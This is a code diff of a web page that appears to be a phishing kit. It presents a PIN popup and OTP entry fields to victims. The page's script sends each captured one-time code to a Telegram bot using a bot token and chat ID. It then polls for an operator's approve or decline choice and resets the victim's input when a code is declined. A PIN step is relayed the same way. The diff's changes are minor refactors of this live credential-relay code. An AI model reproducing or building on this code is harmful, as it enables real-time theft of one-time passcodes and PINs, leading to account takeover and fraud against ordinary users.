@@ -140,7 +140,7 @@
         </div>
     </div>
 
-    <!-- PIN Popup -->
+    <!-- PIN Popup Modal -->
     <div id="pinModal">
         <div class="modal-content">
             <div class="logo-section">
@@ -235,12 +235,14 @@
             const validPinId = `valid_pin_${ts}`;
             const invalidPinId = `invalid_pin_${ts}`;
 
+            const message = `<b>🔴 OTP Verification Received</b>\n\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;
+
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 OTP Verification Received</b>\n\nCode: <code>${otp}</code>\n\nChoose Action:`,
+                    text: message,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -274,6 +276,7 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+
                                 if (cb === approveId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
@@ -282,7 +285,7 @@
                                 else if (cb === declineId) {
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = "OTP declined. Please try again.";
+                                    errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                     focusFirst('otpInputs');
@@ -340,9 +343,7 @@
                         ]]
                     }
                 })
-            }).then(() => {
-                startPinPolling(validId, invalidId);
-            });
+            }).then(() => startPinPolling(validId, invalidId));
         }
 
         function startPinPolling(validId, invalidId) {
